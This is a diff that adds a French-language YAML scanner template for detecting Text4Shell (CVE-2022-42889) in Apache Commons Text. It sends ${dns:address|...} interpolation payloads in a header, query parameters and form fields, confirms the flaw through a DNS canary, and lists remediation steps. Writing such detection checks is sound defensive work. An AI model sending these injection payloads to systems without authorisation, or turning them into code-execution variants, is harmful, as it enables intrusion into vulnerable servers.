@@ -1,0 +1,46 @@
+id: text4shell
+name: Text4ShellChecker
+version: 2.0.0
+author: OpenCVEC
+cves: [CVE-2022-42889]
+product: Apache Commons Text 1.5 à 1.9
+description: >-
+  Injecte une interpolation ${dns:…} dans les paramètres et un formulaire. Une application qui
+  passe ces valeurs à StringSubstitutor avec une version vulnérable résout le canari.
+mode: canary
+proof: Requête DNS sur le canari
+sent: "${dns:address|<point>.<canari>} : uniquement une résolution de nom, aucune autre action sur la cible."
+remediation:
+  - Mettre Commons Text à jour en 1.10.0 ou plus.
+  - Ne jamais interpoler des données externes avec StringSubstitutor.createInterpolator().
+  - Relancer le check pour confirmer la correction.
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2022-42889
+tags: [java]
+lab_validated: false
+lab_note: À revalider après migration en plugin.
+steps:
+  - id: get
+    http:
+      method: GET
+      path: "{{target.path}}?q=%24%7Bdns%3Aaddress%7C{{canary.dns.p2}}%7D&search=%24%7Bdns%3Aaddress%7C{{canary.dns.p3}}%7D&id=%24%7Bdns%3Aaddress%7C{{canary.dns.p4}}%7D&name=%24%7Bdns%3Aaddress%7C{{canary.dns.p5}}%7D&text=%24%7Bdns%3Aaddress%7C{{canary.dns.p6}}%7D"
+      headers:
+        User-Agent: "${dns:address|{{canary.dns.p1}}}"
+    points:
+      p1: en-tête User-Agent
+      p2: paramètre GET q
+      p3: paramètre GET search
+      p4: paramètre GET id
+      p5: paramètre GET name
+      p6: paramètre GET text
+  - id: form
+    http:
+      method: POST
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: "q=%24%7Bdns%3Aaddress%7C{{canary.dns.p7}}%7D&text=%24%7Bdns%3Aaddress%7C{{canary.dns.p8}}%7D"
+    points:
+      p7: champ POST q
+      p8: champ POST text
+proofs:
+  callback: true
